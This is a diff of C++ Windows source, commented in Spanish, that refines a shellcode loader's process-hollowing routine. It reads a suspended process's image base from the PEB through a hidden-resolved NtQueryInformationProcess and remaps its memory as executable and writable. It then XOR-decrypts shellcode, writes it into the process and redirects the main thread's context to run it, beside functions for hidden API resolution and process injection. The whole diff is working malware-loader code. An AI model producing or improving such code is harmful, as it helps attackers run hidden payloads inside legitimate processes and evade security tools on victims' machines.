@@ -54,6 +54,7 @@ struct APIAddresses {
     int(WINAPI *MessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
     // ntdll.dll
     NTSTATUS(NTAPI *NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+    NTSTATUS(NTAPI *NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
 };
 APIAddresses APIs;
 
@@ -580,6 +581,52 @@ bool InjectIntoProcess(unsigned char* shellcode, DWORD size) {
     APIs.CloseHandle(snapshot);
     return injectionSuccess;
 }
+bool GetProcessImageBase(HANDLE hProcess, PVOID* pImageBase) {
+    // Obtener dirección del PEB usando NtQueryInformationProcess
+    if (!APIs.NtQueryInformationProcess) {
+        std::cerr << "NtQueryInformationProcess not available" << std::endl;
+        return false;
+    }
+    
+    PROCESS_BASIC_INFORMATION pbi;
+    NTSTATUS status = APIs.NtQueryInformationProcess(
+        hProcess, 
+        ProcessBasicInformation, 
+        &pbi, 
+        sizeof(pbi), 
+        NULL);
+    
+    if (status != 0) {
+        std::cerr << "NtQueryInformationProcess failed: " << status << std::endl;
+        return false;
+    }
+    
+    // Leer la dirección base de la imagen desde el PEB
+    // En x64, ImageBaseAddress está en offset 0x10 del PEB
+    // En x86, está en offset 0x08
+#ifdef _WIN64
+    const DWORD_PTR imageBaseOffset = 0x10;
+#else
+    const DWORD_PTR imageBaseOffset = 0x08;
+#endif
+    PVOID imageBase;
+    SIZE_T bytesRead = 0;
+    
+    if (!APIs.ReadProcessMemory(
+        hProcess, 
+        (LPCVOID)((DWORD_PTR)pbi.PebBaseAddress + imageBaseOffset), 
+        &imageBase, 
+        sizeof(PVOID), 
+        &bytesRead) || 
+        bytesRead != sizeof(PVOID)) {
+        
+        std::cerr << "ReadProcessMemory (PEB ImageBase) failed: " << APIs.GetLastError() << std::endl;
+        return false;
+    }
+    
+    *pImageBase = imageBase;
+    return true;
+}
 
 // Process Hollowing
 bool ProcessHollowing(unsigned char* shellcode, DWORD shellcodeSize) {
@@ -616,20 +663,23 @@ bool ProcessHollowing(unsigned char* shellcode, DWORD shellcodeSize) {
     
     std::cout << "Proceso creado en estado suspendido (PID: " << pi.dwProcessId << ")" << std::endl;
     
-    // Obtener el contexto del hilo principal
-    CONTEXT context;
-    context.ContextFlags = CONTEXT_FULL;
-    if (!GetThreadContext(pi.hThread, &context)) {
-        std::cerr << "GetThreadContext failed: " << GetLastError() << std::endl;
+    // Obtener la dirección base de la imagen del proceso
+    PVOID imageBaseAddress;
+    if (!GetProcessImageBase(pi.hProcess, &imageBaseAddress)) {
         TerminateProcess(pi.hProcess, 1);
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
         return false;
     }
     
+    std::cout << "Direccion base de la imagen: " << imageBaseAddress << std::endl;
+    
     // Leer la cabecera PE del proceso
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)malloc(sizeof(IMAGE_DOS_HEADER));
-    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)context.Rdx, pDosHeader, sizeof(IMAGE_DOS_HEADER), NULL)) {
+    SIZE_T bytesRead = 0;
+    
+    if (!ReadProcessMemory(pi.hProcess, imageBaseAddress, pDosHeader, sizeof(IMAGE_DOS_HEADER), &bytesRead) || 
+        bytesRead != sizeof(IMAGE_DOS_HEADER)) {
         std::cerr << "ReadProcessMemory (DOS header) failed: " << GetLastError() << std::endl;
         TerminateProcess(pi.hProcess, 1);
         CloseHandle(pi.hThread);
@@ -640,7 +690,7 @@ bool ProcessHollowing(unsigned char* shellcode, DWORD shellcodeSize) {
     
     // Verificar la firma MZ
     if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-        std::cerr << "Invalid DOS signature" << std::endl;
+        std::cerr << "Invalid DOS signature (0x" << std::hex << pDosHeader->e_magic << ")" << std::endl;
         TerminateProcess(pi.hProcess, 1);
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
@@ -650,7 +700,9 @@ bool ProcessHollowing(unsigned char* shellcode, DWORD shellcodeSize) {
     
     // Leer la cabecera PE
     PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)malloc(sizeof(IMAGE_NT_HEADERS));
-    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(context.Rdx + pDosHeader->e_lfanew), pNtHeaders, sizeof(IMAGE_NT_HEADERS), NULL)) {
+    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)((DWORD_PTR)imageBaseAddress + pDosHeader->e_lfanew), 
+                          pNtHeaders, sizeof(IMAGE_NT_HEADERS), &bytesRead) || 
+        bytesRead != sizeof(IMAGE_NT_HEADERS)) {
         std::cerr << "ReadProcessMemory (NT headers) failed: " << GetLastError() << std::endl;
         TerminateProcess(pi.hProcess, 1);
         CloseHandle(pi.hThread);
@@ -662,7 +714,7 @@ bool ProcessHollowing(unsigned char* shellcode, DWORD shellcodeSize) {
     
     // Verificar la firma PE
     if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
-        std::cerr << "Invalid PE signature" << std::endl;
+        std::cerr << "Invalid PE signature (0x" << std::hex << pNtHeaders->Signature << ")" << std::endl;
         TerminateProcess(pi.hProcess, 1);
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
@@ -671,46 +723,76 @@ bool ProcessHollowing(unsigned char* shellcode, DWORD shellcodeSize) {
         return false;
     }
     
-    // Obtener la dirección base de la imagen
-    LPVOID pImageBase = (LPVOID)context.Rdx;
+    // Obtener el tamaño de la imagen del proceso original
+    DWORD imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
+    std::cout << "Tamaño de la imagen original: " << std::dec << imageSize << " bytes" << std::endl;
     
-    // Desasignar la memoria original del proceso
-    if (!VirtualFreeEx(pi.hProcess, pImageBase, 0, MEM_RELEASE)) {
-        std::cerr << "VirtualFreeEx failed: " << GetLastError() << std::endl;
-        TerminateProcess(pi.hProcess, 1);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-        free(pDosHeader);
-        free(pNtHeaders);
-        return false;
+    LPVOID pNewImageBase = NULL;
+    DWORD oldProtect;
+    
+    // Intentar cambiar los permisos de la memoria existente
+    if (VirtualProtectEx(pi.hProcess, imageBaseAddress, imageSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        std::cout << "Permisos de memoria cambiados exitosamente" << std::endl;
+        pNewImageBase = imageBaseAddress;
+    } else {
+        DWORD error = GetLastError();
+        std::cerr << "VirtualProtectEx failed: " << error << std::endl;
+        
+        // Si no podemos cambiar los permisos, intentamos liberar y reasignar
+        if (!VirtualFreeEx(pi.hProcess, imageBaseAddress, 0, MEM_RELEASE)) {
+            error = GetLastError();
+            std::cerr << "VirtualFreeEx (release) failed: " << error << std::endl;
+            TerminateProcess(pi.hProcess, 1);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+            free(pDosHeader);
+            free(pNtHeaders);
+            return false;
+        }
+        
+        std::cout << "Memoria original liberada exitosamente" << std::endl;
+        
+        // Asignar nueva memoria para el shellcode
+        pNewImageBase = VirtualAllocEx(
+            pi.hProcess,
+            imageBaseAddress,  // Intentar asignar en la misma dirección
+            shellcodeSize,     // Solo el tamaño necesario para el shellcode
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE);
+        
+        if (!pNewImageBase) {
+            // Si no podemos asignar en la dirección base, intentamos en cualquier dirección
+            pNewImageBase = VirtualAllocEx(
+                pi.hProcess,
+                NULL,           // Dejar que el sistema elija
+                shellcodeSize,
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE);
+            
+            if (!pNewImageBase) {
+                std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
+                TerminateProcess(pi.hProcess, 1);
+                CloseHandle(pi.hThread);
+                CloseHandle(pi.hProcess);
+                free(pDosHeader);
+                free(pNtHeaders);
+                return false;
+            }
+        }
+        std::cout << "Nueva memoria asignada en: " << pNewImageBase << std::endl;
     }
-    
-    std::cout << "Memoria original desasignada" << std::endl;
-    
-    // Asignar nueva memoria para el shellcode
-    LPVOID pNewImageBase = VirtualAllocEx(
-        pi.hProcess,
-        pImageBase,
-        shellcodeSize,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE);
-    
-    if (!pNewImageBase) {
-        std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
-        TerminateProcess(pi.hProcess, 1);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-        free(pDosHeader);
-        free(pNtHeaders);
-        return false;
-    }
-    
-    std::cout << "Nueva memoria asignada en: " << pNewImageBase << std::endl;
     
     // Desencriptar el shellcode antes de inyectarlo
     unsigned char* decryptedShellcode = new unsigned char[shellcodeSize];
     memcpy(decryptedShellcode, shellcode, shellcodeSize);
     XorCrypt(decryptedShellcode, shellcodeSize, encryptionKey, sizeof(encryptionKey));
+    
+    // Imprimir primeros bytes del shellcode para depuración
+    std::cout << "Primeros bytes del shellcode desencriptado: ";
+    for (int i = 0; i < 20 && i < shellcodeSize; i++) {
+        printf("%02x ", decryptedShellcode[i]);
+    }
+    std::cout << std::endl;
     
     // Escribir el shellcode en la memoria del proceso
     if (!WriteProcessMemory(pi.hProcess, pNewImageBase, decryptedShellcode, shellcodeSize, NULL)) {
@@ -726,8 +808,28 @@ bool ProcessHollowing(unsigned char* shellcode, DWORD shellcodeSize) {
     
     std::cout << "Shellcode escrito en el proceso" << std::endl;
     
-    // Modificar el punto de entrada en el contexto del hilo
+    // Obtener el contexto del hilo principal
+    CONTEXT context;
+    context.ContextFlags = CONTEXT_FULL;
+    if (!GetThreadContext(pi.hThread, &context)) {
+        std::cerr << "GetThreadContext failed: " << GetLastError() << std::endl;
+        TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        free(pDosHeader);
+        free(pNtHeaders);
+        delete[] decryptedShellcode;
+        return false;
+    }
+    
+    // Establecer correctamente el punto de entrada
+#ifdef _WIN64
     context.Rcx = (DWORD64)pNewImageBase;
+    std::cout << "Estableciendo punto de entrada (Rcx) en: 0x" << std::hex << context.Rcx << std::endl;
+#else
+    context.Eax = (DWORD)pNewImageBase;
+    std::cout << "Estableciendo punto de entrada (Eax) en: 0x" << std::hex << context.Eax << std::endl;
+#endif
     
     // Actualizar el contexto del hilo
     if (!SetThreadContext(pi.hThread, &context)) {
@@ -1036,6 +1138,9 @@ bool InitializeAPIs() {
     const char* ntAllocateVirtualMemoryName ="NtAllocateVirtualMemory";
     APIs.NtAllocateVirtualMemory = (NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))GetProcAddressHidden(ntdllBase, ntAllocateVirtualMemoryName);
     
+    const char* ntQueryInformationProcessName = "NtQueryInformationProcess";
+    APIs.NtQueryInformationProcess = (NTSTATUS(NTAPI*)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddressHidden(ntdllBase, ntQueryInformationProcessName);
+
     // Verificar que todas las APIs se resolvieron correctamente
     if (!APIs.LoadLibraryA || !APIs.GetProcAddress || !APIs.VirtualAlloc || !APIs.VirtualProtect ||
         !APIs.CreateThread || !APIs.WaitForSingleObject || !APIs.CloseHandle ||
@@ -1048,7 +1153,7 @@ bool InitializeAPIs() {
         !APIs.GetExitCodeThread || !APIs.VirtualFree || !APIs.NtAllocateVirtualMemory ||
         // Nuevas APIs para Process Hollowing
         !APIs.CreateProcessA || !APIs.GetThreadContext || !APIs.SetThreadContext ||
-        !APIs.ReadProcessMemory || !APIs.ResumeThread || !APIs.TerminateProcess) {
+        !APIs.ReadProcessMemory || !APIs.ResumeThread || !APIs.TerminateProcess || !APIs.NtAllocateVirtualMemory) {
         std::cerr << "Error al resolver una o más APIs" << std::endl;
         return false;
     }
